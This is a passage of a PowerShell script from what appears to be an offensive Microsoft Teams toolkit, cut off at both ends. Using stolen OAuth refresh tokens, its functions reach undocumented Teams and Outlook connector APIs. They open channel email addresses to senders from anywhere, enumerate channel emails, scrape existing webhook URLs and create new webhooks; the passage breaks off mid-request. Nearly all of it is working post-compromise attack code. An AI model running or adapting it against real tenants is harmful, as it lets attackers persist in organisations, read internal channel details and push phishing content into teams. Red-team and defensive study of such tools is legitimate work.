                } elseif (-not $Teams) {
                    continue
                } else {
                    Write-Host -ForegroundColor Red "Error: Channel '$Channel' not found in team '$Teams'. Please ensure the channel name is correct."
                    break
                }
            }
        }
        if (-not $channelId) {
            Write-Host -ForegroundColor Red "Error Channel Not found..."
            Write-Host -ForegroundColor Red "Please ensure the channel name is correct"
            return
        }
                $headers2 = @{
                    "Host"       = "outlook.office.com"
                    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
                }
                ### Set the cookie Value you needs to be the team Channel ID
                $Cookie = New-Object System.Net.Cookie
                $Cookie.Name = "SkypeSpacesTeamId" 
                $Cookie.Value = "$channelId" 
                $Cookie.Domain = "outlook.office.com"
                $WebSession.Cookies.Add($Cookie)

                $token3 = $response2.access_token

                ###This is where we get a SPECIFIC SkypeSpaceToken that allows us Query the configuration API
                $headers3 = @{
                    "Authorization" = "Bearer $token3"
                    "User-Agent"    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
                    "Origin"        = "https://teams.microsoft.com"

                }
                $response6 = Invoke-WebRequest -Uri "https://teams.microsoft.com/api/authsvc/v1.0/authz" -Method POST -headers $headers3
                $jsonResponse = $response6.Content | ConvertFrom-Json
                $skypeToken = $jsonResponse.Tokens.skypeToken
                [string]$permissions = "" 

            try {
                Write-Host "Checking Channel for Email Address"
                    $Channelheader = @{
                        "Authorization" = "Bearer $token3"
                        "User-Agent"    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
                        "Origin"        = "https://teams.microsoft.com"
                        "X-Skypetoken"  = "$skypeToken"
                    }

                    $EmailChannel = Invoke-WebRequest -Uri "https://teams.microsoft.com/api/mt/amer/beta/channels/$channelId/email" -Method GET -headers $Channelheader
                    $jsonResponse = $EmailChannel.Content | ConvertFrom-Json
                    Write-Host "Current Channel Settings"
                    Write-Host "Channel Email: $($jsonResponse.emailAddressDetails.emailId)"
                    Write-Host "Channel Permissions: $($jsonResponse.allowedSenders.allowedSenderType)"
                    $permissions = $jsonResponse.allowedSenders
                }
                catch {
                    if ($_.Exception.Response.StatusCode -eq 'NotFound') {
                        Write-Host -ForegroundColor Yellow "No Channel for Email Address Set"
                        Write-Host -ForegroundColor Yellow "Creating one..."
                        $PostChannelheader = @{
                            "Authorization" = "Bearer $token3"
                            "X-Skypetoken"  = "$skypeToken"
                            "User-Agent"    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
                            "Content-Type" = "application/json;charset=UTF-8"
                        }
                        $body = "{`"allowedSenderType`":`"anyone`",`"allowedDomains`":null}"
                        $EmailChannel = Invoke-WebRequest -Uri "https://teams.microsoft.com/api/mt/amer/beta/channels/$channelId/email" -Method POST -headers $PostChannelheader -Body $body -ContentType $null
                        $jsonResponse = $EmailChannel.Content | ConvertFrom-Json
                        Write-Host "Current Channel Settings"
                        Write-Host "Channel Email: $($jsonResponse.emailAddressDetails.emailId)"
                        Write-Host "Channel Permissions: $($jsonResponse.allowedSenders.allowedSenderType)"
                        $permissions = $jsonResponse.allowedSenders
                    }
                    if ($_.Exception.Response.StatusCode -eq 'Unauthorized') {
                        Write-Host -ForegroundColor Red "Error: Access-Denied"
                        Write-Host -ForegroundColor Yellow "User has insufficient privileges..."
                    }

                }
        if ($jsonResponse.allowedSenders.allowedSenderType -eq "members") {
                    Write-Host -ForegroundColor Yellow "Email Address Permissions Set to Member"
                    Write-Host -ForegroundColor Yellow "Changing Email Address Permissions to Anyone"
                    $SetChannelheader = @{
                        "Authorization" = "Bearer $token3"
                        "User-Agent"    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
                        "Origin"        = "https://teams.microsoft.com"
                        "X-Skypetoken"  = "$skypeToken"
                    }
                    $body = "{`"allowedSenderType`":`"anyone`",`"allowedDomains`":null}"
                    $EmailChannel = Invoke-WebRequest -Uri "https://teams.microsoft.com/api/mt/amer/beta/channels/$channelId/email" -Method PUT -headers $SetChannelheader -Body $body 
                    $EmailChannel = Invoke-WebRequest -Uri "https://teams.microsoft.com/api/mt/amer/beta/channels/$channelId/email" -Method GET -headers $Channelheader
                    $jsonResponse = $EmailChannel.Content | ConvertFrom-Json
                    Write-Host "Updated Channel Settings"
                    Write-Host "Channel Email: $($jsonResponse.emailAddressDetails.emailId)"
                    Write-Host "Channel Permissions: $($jsonResponse.allowedSenders.allowedSenderType)"
                }
}
function Find-ChannelEmails{
    <#
    .SYNOPSIS
        Author: Matt Eidelberg (@Tyl0us)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        This module enumerates all accessible teams and the channels looking for any email addresses assoicated with them. 

    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter

    .EXAMPLE
        
        C:\PS> Find-ChannelEmails -Tokens $tokens 
        -----------
        This module  enumerates all accessible teams and the channels looking for any email addresses assoicated with them. 
    #>
    Param (
        [Parameter(Position = 0, Mandatory = $False)]
        [object[]]
        $Tokens
        )
        if(!$Tokens){
            if ($global:tokens){
                $tokens = $global:tokens   
            } else {
                # Login
                Write-Host -ForegroundColor yellow "[*] First, you need to login." 
                Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
                while($auth -notlike "Yes"){
                    Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                    $answer = Read-Host 
                    $answer = $answer.ToLower()
                    if ($answer -eq "yes" -or $answer -eq "y") {
                        Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                        $tokens = Get-GraphTokens -ExternalCall
                        $auth = "Yes"
                    } elseif ($answer -eq "no" -or $answer -eq "n") {
                        Write-Host -ForegroundColor Yellow "[*] Quitting..."
                        return
                    } else {
                        Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                    }
                }
            }
        }    
        $accesstoken = $tokens.access_token
        $channelString = $Channel
        [string]$refreshtoken = $tokens.refresh_token 

        $scope = "https://outlook.office365.com/connectors/.default openid profile offline_access"
        $grantType = "refresh_token"

        $access_token = $tokens.access_token   
        $teamsheaders = @{
            Authorization  = "Bearer $access_token"
            "Content-Type" = "application/json"
            "User-Agent"   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
        }
        $teamsResponse = Invoke-RestMethod -Method Get -Uri "https://graph.microsoft.com/v1.0/me/joinedTeams" -Headers $teamsheaders
        foreach ($team in $teamsResponse.value) {
            $teamId = $team.id
            $teamName = $team.displayName
            $channelsResponse = Invoke-RestMethod -Headers $teamsheaders -Uri "https://graph.microsoft.com/v1.0/teams/$teamId/channels" -Method Get -ErrorAction Stop
            foreach ($channelinfo in $channelsResponse.value) {
                    if ($channelinfo.email -ne $null) {
                    $channelId = $channelinfo.id
                    $channelDesc = $channelinfo.Description
                    $channelName = $channelinfo.displayName
                    $channelEmail = $channelinfo.email
                    Write-Host "Team Name: $teamName"
                    Write-Host "Channel Name: $($channelName)"
                    Write-Host "Channel ID: $($channelId)"
                    Write-Host "Channel Description: $($channelDesc)"
                    Write-Host "Channel Email: $($channelEmail)"
                }
            }
        }
}


function Get-Webhooks{
    <#
    .SYNOPSIS
        This module enumerates all accessible channels by looking for any webhooks and their configuration information, including the webhook url. 
        Author: Matt Eidelberg (@Tyl0us)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        This module enumerates all accessible channels by looking for any webhooks and their configuration information, including the webhook url. 


    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter
  
    .EXAMPLE
        
        C:\PS> Get-Webhooks -Tokens $tokens
        -----------
        This module enumerates all accessible channels by looking for any webhooks and their configuration information, including the webhook url. 

    #>
    Param (
        [Parameter(Position = 0, Mandatory = $False)]
        [object[]]
        $Tokens
        )
        if(!$Tokens){
            if ($global:tokens){
                $tokens = $global:tokens   
            } else {
                # Login
                Write-Host -ForegroundColor yellow "[*] First, you need to login." 
                Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
                while($auth -notlike "Yes"){
                    Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                    $answer = Read-Host 
                    $answer = $answer.ToLower()
                    if ($answer -eq "yes" -or $answer -eq "y") {
                        Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                        $tokens = Get-GraphTokens -ExternalCall
                        $auth = "Yes"
                    } elseif ($answer -eq "no" -or $answer -eq "n") {
                        Write-Host -ForegroundColor Yellow "[*] Quitting..."
                        return
                    } else {
                        Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                    }
                }
            }
        }
            $accesstoken = $tokens.access_token   
            [string]$refreshtoken = $tokens.refresh_token 
            
            $scope = "https://outlook.office365.com/connectors/.default openid profile offline_access"
            $grantType = "refresh_token"
            
            $body = @{
                client_id           = $clientId
                scope               = $scope
                grant_type          = $grantType
                refresh_token       = $refreshToken
                client_info         = 1
                "client-request-id" = (New-Guid).ToString()
            }
            $response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantid/oauth2/v2.0/token" -Method Post -ContentType "application/x-www-form-urlencoded;charset=utf-8" -Body $body
            $token2 = $response.access_token
            
            $scope2 = "https://api.spaces.skype.com/.default openid profile offline_access"
            $grantType = "refresh_token"
            
            $body = @{
                client_id           = $clientId
                scope               = $scope2
                grant_type          = $grantType
                refresh_token       = $refreshToken
                client_info         = 1
                "client-request-id" = (New-Guid).ToString()
            }
            $response2 = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantid/oauth2/v2.0/token" -Method Post -ContentType "application/x-www-form-urlencoded;charset=utf-8" -Body $body
            $SStoken = $response2.access_token
            
            ### Since we are looping through every channel we need to purge these values each time
            if ($WebSession) {
                Write-Host "WebSessions exists clearing old data"
                Remove-Variable -Name WebSession
                Remove-Variable -Name SuperAwesomeSession
                Remove-Variable -Name Cookie
                Remove-Variable -Name Cookie1
                Remove-Variable -Name tempSessions
            }
            else {
            }
            
            $headers = @{
                "Host"             = "outlook.office.com"
                "Cache-Control"    = "no-cache"
                "Pragma"           = "no-cache"
                "Sec-Ch-Ua-Mobile" = "?0"
                "Authorization"    = "Bearer $token2"
                "Sstoken"          = "$SStoken"
                "User-Agent"       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
            }
            
            $response3 = Invoke-WebRequest -Uri "https://outlook.office.com/connectors/Manage/AuthorizeUsingToken?client=SkypeSpaces" -Method Get -SessionVariable WebSession -headers $headers
            $url = 'https://outlook.office.com'
            $WebSession.Headers.Clear()
            
            $access_token = $tokens.access_token   
            $teamsheaders = @{
                Authorization  = "Bearer $access_token"
                "Content-Type" = "application/json"
            }
            $teamsResponse = Invoke-RestMethod -Method Get -Uri "https://graph.microsoft.com/v1.0/me/joinedTeams" -Headers $teamsheaders
            
            foreach ($team in $teamsResponse.value) {
                $teamId = $team.id
                Write-Host "Team: $($team.displayName)"
                Write-Host "TeamID: $($teamId)"
                $channelsResponse = Invoke-RestMethod -Headers $teamsheaders -Uri "https://graph.microsoft.com/v1.0/teams/$teamId/channels" -Method Get -ErrorAction Stop
                foreach ($channel in $channelsResponse.value) {
                    $channelId = $channel.id
                    Write-Host "  Checking Channel: $($channel.displayName)"
                    $channelName = $channel.displayName
                   
                    $headers2 = @{
                        "Host"       = "outlook.office.com"
                        "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
                    }
            
                    ### Set the cookie Value you needs to be the team Channel ID
                    $Cookie = New-Object System.Net.Cookie
                    $Cookie.Name = "SkypeSpacesTeamId"
                    $Cookie.Value = "$channelId"
                    $Cookie.Domain = "outlook.office.com"
                    $WebSession.Cookies.Add($Cookie)
            
                    $token3 = $response2.access_token
            
            
                    ### This is where we get a SPECIFIC SkypeSpaceToken that allows us Query the configuration API
                    $headers3 = @{
                        "Authorization" = "Bearer $token3"
                        "User-Agent"    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
                        "Origin"        = "https://teams.microsoft.com"
            
                    }
                    $response6 = Invoke-WebRequest -Uri "https://teams.microsoft.com/api/authsvc/v1.0/authz" -Method POST  -headers $headers3
                    $jsonResponse = $response6.Content | ConvertFrom-Json
                    $skypeToken = $jsonResponse.Tokens.skypeToken
            
            
                    ### Create a temp copy of the websessions then replace the SkypeSpaceToken for the ConfigurationManager API
                    $tempSessions = $WebSession
            
                    $cookieName = "SkypeSpacesToken" 
                    $newValue = "$skypeToken" 
                    $SuperAwesomeSession = New-Object System.Net.CookieContainer
                    foreach ($cookie in $websession.Cookies.GetCookies($url)) {
                        if ($cookie.Name -ne "SkypeSpacesToken") {
                            $SuperAwesomeSession.Add($cookie)
                        }
                    }
            
                    $webSession.Cookies = $SuperAwesomeSession
                    $Cookie1 = New-Object System.Net.Cookie
                    $Cookie1.Name = "SkypeSpacesToken" 
                    $Cookie1.Value = "$skypeToken"
                    $Cookie1.Domain = "outlook.office.com"
                    $tempSessions.Cookies.Add($Cookie1)
            
            
                    $headers4 = @{
                        "Host"       = "outlook.office.com"
                        "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
                    }

                    ### Need to get the MailBox ID client  
                    try {
                        $GetConnectorsConfiginfo = Invoke-WebRequest -Uri "https://outlook.office.com/connectors/Manage/Configurations?MailboxAddress=$teamId%40$tenantid&client=SkypeSpaces&SSThread=$channelId&HostName=teams.microsoft.com&culture=en-us&SSEnv=DM2P&ssChannelName=$channelName&ssApiHost=amer.ng.msg.teams.microsoft.com&iframe=true&SSTheme=default&SSTokenType=SkypeToken&SSFormat=Swift&isDesktopClient=false&enableConnectorApps=tru" -Method Get -WebSession $tempSessions -headers $headers4 -ErrorAction Stop
                    } catch {
                        if ($_.Exception.Response.StatusCode -eq 500) {
                                Write-Host "Retrying in 5 seconds"
                                Start-Sleep -Seconds 5
                                $GetConnectorsConfiginfo = Invoke-WebRequest -Uri "https://outlook.office.com/connectors/Manage/Configurations?MailboxAddress=$teamId%40$tenantid&client=SkypeSpaces&SSThread=$channelId&HostName=teams.microsoft.com&culture=en-us&SSEnv=DM2P&ssChannelName=$channelName&ssApiHost=amer.ng.msg.teams.microsoft.com&iframe=true&SSTheme=default&SSTokenType=SkypeToken&SSFormat=Swift&isDesktopClient=false&enableConnectorApps=tru" -Method Get -WebSession $tempSessions -headers $headers4
                        }
                    }

                    ### Assuming $GetConnectorsConfiginfo.Content contains the JSON string
                    $jsonContent = $GetConnectorsConfiginfo.Content | ConvertFrom-Json
                    if ([string]::IsNullOrEmpty($jsonContent)){
                        Write-Host -ForegroundColor Red "       No Webhook found in channel"
                    }


                    ### Create an array to store ConnectorConfigurationIds
                    $connectorConfigurationIds = @()
            
                    ### Loop through each ProviderGuid
                    foreach ($guid in $jsonContent.PSObject.Properties.Name) {
                        $providerInfo = $jsonContent.$guid
            
                        ### Loop through each ConfiguredConnector under this ProviderGuid
                        foreach ($connector in $providerInfo.ConfiguredConnectors) {
                            ### Add the ConnectorConfigurationId to the array
                            $connectorConfigurationIds = $connector.ConnectorConfigurationId
                  
                            ### Now we can loop through each ConnectorConfigurationId
                            foreach ($configId in $connectorConfigurationIds) {
                                $WebhookinfoResponse = Invoke-WebRequest -Uri "https://outlook.office.com/connectors/IncomingWebhook/Manage/Show?MailboxAddress=$teamId%40$tenantid&client=SkypeSpaces&SSThread=$channelId&HostName=teams.microsoft.com&culture=en-us&ssApiHost=amer.ng.msg.teams.microsoft.com&iframe=true&profileuniquename=$configId" -Method Get -WebSession $WebSession
            
                                $pattern = '<button[^>]+onclick="CopyToClipboard\(''webhookUrl'', ''(https://[^'']+)'','
                                $matches = [regex]::Matches($WebhookinfoResponse.Content, $pattern)
                                $webhookurls = $matches | ForEach-Object { $_.Groups[1].Value }
                                if ($webhookurls -ne "") {
                                    Write-Host "    ChannelID: $($channelId)"
                                    Write-Host "    Connector Details:"
                                    Write-Host "        MailboxName: $($connector.MailboxName)"
                                    Write-Host "        OwnerEmail: $($connector.OwnerEmail)"
                                    Write-Host "        Description: $($connector.Description)"
                                    Write-Host "        ConnectorConfigurationId: $($configId)"
                                    Write-Host "        AddedByDescription: $($connector.AddedByDescription)"
                                    Write-Host "        CorrectiveAction: $($connector.CorrectiveAction)"
                                    Write-Host "        IsUpdateAllowedForUser: $($connector.IsUpdateAllowedForUser)"
                                    Write-Host "        Webhooks: $webhookurls"
                            }
                        }
            
                    }
                }
            }
        }
    }
#}

function Create-Webhook{
        <#
        .SYNOPSIS
            This module creates a webhook in a defined channel and provides the URL.   
            Author: Matt Eidelberg (@Tyl0us)
            License: MIT
            Required Dependencies: None
            Optional Dependencies: None
    
        .DESCRIPTION
            
            This module creates a webhook in a defined channel and provides the URL. 
    
    
        .PARAMETER Tokens
    
            Pass the $tokens global variable after authenticating to this parameter
        
        .PARAMETER Channel
    
            The channel name to create the webhook in

        .PARAMETER Teams

            The team name that the channel resides in 
           
        .PARAMETER Name
    
            The name you want to call the created webhook

        .PARAMETER ConnectorType
    
            The the type of connector to use for the webhook (IncomingWebhook, Jira , Jenkins, AzureDevOps)
      
        .EXAMPLE
            
            C:\PS> Create-Webhook -Tokens $tokens -Channel "Channel Name" -Teams "Team Name" -Name "Evil-Hook" -ConnectorType IncomingWebhook
            -----------
             This module creates a webhook in a defined channel and provides the URL.
    
        #>
        Param (
            [Parameter(Position = 0, Mandatory = $False)]
            [object[]]
            $Tokens,
            [Parameter(Position = 1, Mandatory = $True)]
            [string]
            $Channel = "",
            [Parameter(Position = 2, Mandatory = $False)]
            [string]
            $Teams = "",
            [Parameter(Position = 3, Mandatory = $True)]
            [string]
            $Name = "",
            [Parameter(Position = 4, Mandatory = $True)]
            [ValidateSet("IncomingWebhook","Jira","Jenkins","AzureDevOps")]
            [String]$ConnectorType
            )
            if(!$Tokens){
                if ($global:tokens){
                    $tokens = $global:tokens   
                } else {
                    # Login
                    Write-Host -ForegroundColor yellow "[*] First, you need to login." 
                    Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
                    while($auth -notlike "Yes"){
                        Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                        $answer = Read-Host 
                        $answer = $answer.ToLower()
                        if ($answer -eq "yes" -or $answer -eq "y") {
                            Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                            $tokens = Get-GraphTokens -ExternalCall
                            $auth = "Yes"
                        } elseif ($answer -eq "no" -or $answer -eq "n") {
                            Write-Host -ForegroundColor Yellow "[*] Quitting..."
                            return
                        } else {
                            Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                        }
                    }
                }
            }

        $accesstoken = $tokens.access_token   
        [string]$refreshtoken = $tokens.refresh_token 
        $scope = "https://outlook.office365.com/connectors/.default openid profile offline_access"
        $grantType = "refresh_token"

        if ($ConnectorType -eq "IncomingWebhook") {
            $GroupName = "General"
            $ProviderName = "IncomingWebhook"
            $connectorurl = "IncomingWebhook"
        } if ($ConnectorType -eq "Jira") {
            $GroupName = "$channelName"
            $ProviderName = "JIRA"
            $connectorurl = "JIRA"
        } if ($ConnectorType -eq "Jenkins") {
            $GroupName = "$channelName"
            $ProviderName = "JenkinsCI"
            $connectorurl = "JenkinsCI"
        }if ($ConnectorType -eq "AzureDevOps") {
            $GroupName = "$channelName"
            $ProviderName = "TeamFoundationServer"
            $connectorurl = "TeamFoundationServer"
        }
        Write-Host "Connector Type Selected: $ConnectorType"

        $body = @{
            client_id           = $clientId
            scope               = $scope
            grant_type          = $grantType
            refresh_token       = $refreshToken
            client_info         = 1
            "client-request-id" = (New-Guid).ToString()
        }
        $response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantid/oauth2/v2.0/token" -Method Post -ContentType "application/x-www-form-urlencoded;charset=utf-8" -Body $body
        $token2 = $response.access_token

        $scope2 = "https://api.spaces.skype.com/.default openid profile offline_access"
        $grantType = "refresh_token"

        $body = @{
            client_id           = $clientId
            scope               = $scope2
            grant_type          = $grantType
            refresh_token       = $refreshToken
            client_info         = 1
            "client-request-id" = (New-Guid).ToString()
        }
        $response2 = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantid/oauth2/v2.0/token" -Method Post -ContentType "application/x-www-form-urlencoded;charset=utf-8" -Body $body
        $SStoken = $response2.access_token


        ###Since we are looping through every channel we need to purge these values each time
        if ($WebSession) {
            Write-Host "WebSessions exists clearing old data"
            $WebSession.Headers.Clear()
            Remove-Variable -Name WebSession
            Remove-Variable -Name SuperAwesomeSession
            Remove-Variable -Name Cookie
            Remove-Variable -Name Cookie1
            Remove-Variable -Name tempSessions
        }
        else {
        }

        $headers = @{
            "Host"             = "outlook.office.com"
            "Cache-Control"    = "no-cache"
            "Pragma"           = "no-cache"
            "Sec-Ch-Ua-Mobile" = "?0"
            "Authorization"    = "Bearer $token2"
            "Sstoken"          = "$SStoken"
            "User-Agent"       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
        }

        $response3 = Invoke-WebRequest -Uri "https://outlook.office.com/connectors/Manage/AuthorizeUsingToken?client=SkypeSpaces" -Method Get -SessionVariable WebSession -headers $headers
        $url = 'https://outlook.office.com'
        $WebSession.Headers.Clear()

        ### addded logic to loop through all teams, to get the teams ID and then the channels and their IDs
        $access_token = $tokens.access_token   
        $teamsheaders = @{
            Authorization  = "Bearer $access_token"
            "Content-Type" = "application/json"
        }
        $teamsResponse = Invoke-RestMethod -Method Get -Uri "https://graph.microsoft.com/v1.0/me/joinedTeams" -Headers $teamsheaders
        foreach ($team in $teamsResponse.value) {
            $teamId = $team.id
            $teamName = $team.displayName
            if (-not $Teams -or $teamName -eq $Teams) {
                $channelsResponse = Invoke-RestMethod -Headers $teamsheaders -Uri "https://graph.microsoft.com/v1.0/teams/$teamId/channels" -Method Get -ErrorAction Stop
                foreach ($channelinfo in $channelsResponse.value) {
                    if ($channelinfo.displayName -eq $Channel) {
                        $channelId = $channelinfo.id
                        $channelName = $channelinfo.displayName
                        $channelFound = $true
                        break 
                    }
                }
                if ($channelFound) {
                    break 
                } elseif (-not $Teams) {
                    continue
                } else {
                    Write-Host -ForegroundColor Red "Error: Channel '$Channel' not found in team '$Teams'. Please ensure the channel name is correct."
                    break
                }
            }
        }
                $channelsResponse = Invoke-RestMethod -Headers $teamsheaders -Uri "https://graph.microsoft.com/v1.0/teams/$teamId/channels" -Method Get -ErrorAction Stop
                foreach ($channelinfo in $channelsResponse.value) {
                    if ($channelinfo.displayName -eq "General" ) {
                        $GeneralchannelId = $channelinfo.id
                    }
                }
                foreach ($channelinfo in $channelsResponse.value) {
                    if ($channelinfo.displayName -eq $($Channel)) {
                        $channelId = $channelinfo.id
                        $channelName = $channelinfo.displayName
                        Write-Host "Team Name: $($team.displayName)"
                        $teamId = $team.id
                        Write-Host "Channel Name: $($channelinfo.displayName)"

                        $headers2 = @{
                            "Host"       = "outlook.office.com"
                            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
                        }
                        ### Set the cookie Value you needs to be the team Channel ID
                        $Cookie = New-Object System.Net.Cookie
                        $Cookie.Name = "SkypeSpacesTeamId"
                        $Cookie.Value = "$channelId" 
                        $Cookie.Domain = "outlook.office.com"
                        $WebSession.Cookies.Add($Cookie)

                        $token3 = $response2.access_token

                        ### This is where we get a SkypeSpaceToken that allows us to query the configuration API
                        $headers3 = @{
                            "Authorization" = "Bearer $token3"
                            "User-Agent"    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
                            "Origin"        = "https://teams.microsoft.com"

                        }
                        $response6 = Invoke-WebRequest -Uri "https://teams.microsoft.com/api/authsvc/v1.0/authz" -Method POST -headers $headers3
                        $jsonResponse = $response6.Content | ConvertFrom-Json
                        $skypeToken = $jsonResponse.Tokens.skypeToken

                        ### Create a temp copy of the websessions then replace the SkypeSpaceToken for the ConfigurationManager API
                        $tempSessions = $WebSession

                        $cookieName = "SkypeSpacesToken" 
                        $newValue = "$skypeToken" 
                        $SuperAwesomeSession = New-Object System.Net.CookieContainer
                        foreach ($cookie in $websession.Cookies.GetCookies($url)) {
                            if ($cookie.Name -ne "SkypeSpacesToken") {
                                $SuperAwesomeSession.Add($cookie)
                            }
                        }

                        $webSession.Cookies = $SuperAwesomeSession
                        $Cookie1 = New-Object System.Net.Cookie
                        $Cookie1.Name = "SkypeSpacesToken" 
                        $Cookie1.Value = "$skypeToken"
                        $Cookie1.Domain = "outlook.office.com"
                        $tempSessions.Cookies.Add($Cookie1)



                        $headers4 = @{
                            "Host"       = "outlook.office.com"
                            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
                        }
                        $WHresponse = Invoke-WebRequest -Uri "https://outlook.office.com/connectors/$connectorurl/Manage/New?MailboxAddress=$teamId%40$tenantid&client=SkypeSpaces&SSThread=$channelId&HostName=teams.microsoft.com&culture=en-us&ssApiHost=amer.ng.msg.teams.microsoft.com&iframe=true&SSTheme=default" -Method Get -WebSession $WebSession -headers $headers4 
                        $pattern = '<input\s+name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"'
                        $matches = [regex]::Matches($WHresponse.Content, $pattern)

                        ### Check if there's at least one match and print the first token value
                        if ($matches.Count -gt 0) {
                            $tokenValue = $matches[0].Groups[1].Value
                        }
                        else {
                            Write-Host "Token value not found."
                        }
                        $AltIDpattern = 'id="AlternateId" name="AlternateId" type="hidden" value="([^"]+)"'
                        $AltIDmatches = [regex]::Matches($WHresponse.Content, $AltIDpattern)

                        ### Check if there's at least one match and print the first value
                        if ($AltIDmatches.Count -gt 0) {
                            $AltIDvalue = $AltIDmatches[0].Groups[1].Value
                        }
                        else {
                            Write-Host "Alt value not found."
                        }
                        
                        $ForwardToEmailpattern = 'id="ForwardToEmail" name="ForwardToEmail" type="hidden" value="([^"]+)"'
                        $ForwardToEmailmatches = [regex]::Matches($WHresponse.Content, $ForwardToEmailpattern)

                        ### Check if there's at least one match and print the first email value
                        if ($ForwardToEmailmatches.Count -gt 0) {
                            $ForwardToEmailValue = $ForwardToEmailmatches[0].Groups[1].Value
                        }
                        else {
                            Write-Host "Token value not found."
                        }

                        ### To get the right SkpyeSpaceToken
                        $WebSession.Headers.Clear()
                        Remove-Variable -Name tempSessions
                        Remove-Variable -Name SuperAwesomeSession

                        $tempSessions = $WebSession

                        $cookieName = "SkypeSpacesToken" 
                        $newValue = "$skypeToken" 
                        $SuperAwesomeSession = New-Object System.Net.CookieContainer
                        foreach ($cookie in $websession.Cookies.GetCookies($url)) {
                            if ($cookie.Name -ne "SkypeSpacesToken") {
                                $SuperAwesomeSession.Add($cookie)
                            }
                        }

                        $webSession.Cookies = $SuperAwesomeSession
                        $Cookie1 = New-Object System.Net.Cookie
                        $Cookie1.Name = "SkypeSpacesToken" 
                        $Cookie1.Value = "$skypeToken"
                        $Cookie1.Domain = "outlook.office.com"
                        $tempSessions.Cookies.Add($Cookie1)


                        $WebSession.Headers.Clear()
                        Remove-Variable -Name tempSessions
                        Remove-Variable -Name SuperAwesomeSession
        
                        $tempSessions = $WebSession
        
                        $cookieName = "SkypeSpacesTeamId" 
                        $newValue = "$GeneralchannelId" 
                        $SuperAwesomeSession = New-Object System.Net.CookieContainer
                        foreach ($cookie in $websession.Cookies.GetCookies($url)) {
                            if ($cookie.Name -ne "SkypeSpacesTeamId") {
                                $SuperAwesomeSession.Add($cookie)
                            }
                        }
        
                        $webSession.Cookies = $SuperAwesomeSession
                        $Cookie1 = New-Object System.Net.Cookie
                        $Cookie1.Name = "SkypeSpacesTeamId" 
                        $Cookie1.Value = "$GeneralchannelId"
                        $Cookie1.Domain = "outlook.office.com"
                        $tempSessions.Cookies.Add($Cookie1)

                        $webhookname= $name
                        $length = 16
                        $characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
                        $randomString = -join ((1..$length) | ForEach-Object { Get-Random -InputObject $characters.ToCharArray() })
                        #Write-Output $randomString

                    
                        $Creationheaders = @{
                            "Host"       = "outlook.office.com"
                            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36"
                        }
                        $LF = "`r`n";
                        $boundary = "----WebKitFormBoundary$randomString"

                        $bodyLines = ( 
                            "--$boundary",
                            "Content-Disposition: form-data; name=`"__RequestVerificationToken`"$LF",
                            "$tokenValue",
                            "--$boundary",
                            "Content-Disposition: form-data; name=`"ConnectorConfigurationId`"",
                            "$LF",    
                            "--$boundary",
